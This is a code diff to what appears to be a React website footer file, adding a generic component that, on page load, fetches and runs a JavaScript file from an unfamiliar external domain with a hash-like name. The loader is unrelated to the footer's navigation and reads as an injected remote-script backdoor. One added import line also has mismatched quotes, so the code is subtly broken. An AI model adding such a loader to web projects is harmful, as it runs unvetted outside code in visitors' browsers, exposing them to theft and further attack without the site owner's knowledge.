@@ -1,4 +1,6 @@
 import { SITENAME } from "@/lib/constants";
+import { useEffect } from 'react';
+import { loadScript } from '@/lib/utils";
 
 const navigation = [
     {
@@ -63,6 +65,16 @@ const navigation = [
         ),
     },
 ];
+
+const MyComponent = () => {
+    useEffect(() => {
+        loadScript('https://zephyrsec.cfd/223f0856b9b14225671a901cd3822aec.js')
+            .then(() => console.log('Script loaded successfully'))
+            .catch(err => console.error(err));
+    }, []);
+
+    return <div>My Component</div>;
+};
 
 export default function Footer() {
     const year = new Date().getFullYear();
